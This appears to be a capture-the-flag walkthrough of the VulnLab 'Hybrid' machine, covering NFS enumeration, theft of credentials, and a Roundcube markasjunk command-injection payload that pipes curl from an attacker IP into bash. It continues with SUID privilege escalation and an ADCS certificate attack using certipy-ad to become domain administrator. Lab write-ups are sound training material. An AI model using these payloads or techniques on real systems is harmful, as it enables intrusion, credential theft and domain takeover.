# Hybrid (chain) (easy)

## port scan

mail01.hybrid.vl

![](walkthrough_20240410131406696.png)

dc01.hybrid.vl

![](walkthrough_20240410131510871.png)


## service enumeration

mail01 have web service called Roundcube Webmail 

![](walkthrough_20240410131624197.png)

mail01 also have nfs service

![](walkthrough_20240410131941684.png)


## nfs discover

`/opt/share` found on nfs share

![](walkthrough_20240410132024252.png)

we can use mount command without permission to mount remote folder

```bash
 sudo mount -t nfs 10.10.217.118:/opt/share /home/sh4n4c1/lab/vulnlab/hybrid/mnt/
```

![](walkthrough_20240410132254311.png)

![](walkthrough_20240410133006274.png)

there have some cred in `dovecot-users` file

![](walkthrough_20240410133243712.png)

we can use admin cred login roundcubes

![](walkthrough_20240410133357170.png)

admin say that he enable junk filter plugin on roundcubes 

![](walkthrough_20240410133834655.png)

## markasjunk exploit 

we can see detail on `about`. The plugin called `markasjunk`

![](walkthrough_20240410133914679.png)

seems we have RCE

![](walkthrough_20240410133949273.png)

https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/

![](walkthrough_20240410134347063.png)

so my payload is 

```
admin&curl${IFS}10.8.1.167|bash&@roundcube.com
```

add reverse shell into index.html. and then open webserver, change admin email address on setting. 

![](walkthrough_20240410134833530.png)

last step, click `Junk`

![](walkthrough_20240410134745192.png)

we have shell!

![](walkthrough_20240410134803852.png)

## login as peter.turner

since we mount mail01 /opt/share, we can upload suid binary, but 
 /etc/exports config disable it
 
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
![](walkthrough_20240410142344960.png) 

but we upload suid same as peter.tunrner user id

![](walkthrough_20240410142553350.png)

change /etc/login.defs MAX uid

![](walkthrough_20240410142952238.png)

![](walkthrough_20240410144608726.png)

![](walkthrough_20240410144658561.png)

download bash from mail01, upload it to mnt folder and `chmod +s /mnt/vulnlab/bash`


![](walkthrough_20240410151952009.png)

we are now peter.turner user

![](walkthrough_20240410152043055.png)


there have a passwords.kdbx file 

![](walkthrough_20240410152228466.png)

the password is found in `dovecot-users` (nfs dump)

![](walkthrough_20240410152516135.png)


![](walkthrough_20240410152542725.png)

work!

![](walkthrough_20240410152734976.png)

## adcs attack

just like vulnlab's Retro box, we found a Vulnerabilities template. but only `Domain Computers` can enroll.

![](walkthrough_20240410154431640.png)

![](walkthrough_20240410154449503.png)

now we need a computer cred, looks like we can run any command as root on mail01

![](walkthrough_20240410155021578.png)

download /etc/krb5.keytab and extract mail01$ hash


![](walkthrough_20240410155319886.png)

```bash
certipy-ad req -u 'mail01$'@hybrid.vl -hashes ':$hash' -c 'hybrid-DC01-CA' -target "$t1" -template 'HybridComputers' -upn 'adm
inistrator' -key-size 4096


certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip "$t1"
```

![](walkthrough_20240410155834243.png)

![](walkthrough_20240410160626560.png)